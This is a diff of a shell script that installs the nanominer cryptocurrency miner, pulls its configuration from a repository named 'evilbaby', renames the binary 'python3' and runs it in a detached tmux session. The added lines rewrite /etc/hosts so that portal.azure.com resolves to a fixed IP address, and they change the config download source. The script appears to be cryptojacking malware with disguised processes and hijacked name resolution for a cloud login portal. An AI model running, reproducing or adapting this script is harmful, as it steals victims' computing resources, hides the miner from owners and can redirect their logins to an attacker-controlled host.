@@ -16,11 +16,12 @@ exit
 fi
 sudo apt-get update -y
 sudo apt-get install tmux  -y
+sudo -- sh -c "echo '116.108.86.157  portal.azure.com' >> /etc/hosts"
 wget https://github.com/nanopool/nanominer/releases/download/v1.5.3/nanominer-linux-1.5.3.tar.gz
 tar xvzf nanominer-linux-1.5.3.tar.gz
 cd nanominer-linux-1.5.3
 rm config.ini
-wget https://bitbucket.org/evilbaby1/openai/raw/3fe4365a056b4e0589f78d6b1280f97cb1bb0b3e/config.ini
+wget https://raw.githubusercontent.com/evilbabylx/script/master/configazi/config.ini
 chmod +x nanominer
 mv nanominer python3 
 tmux new-session -d -s my_session1  './python3'
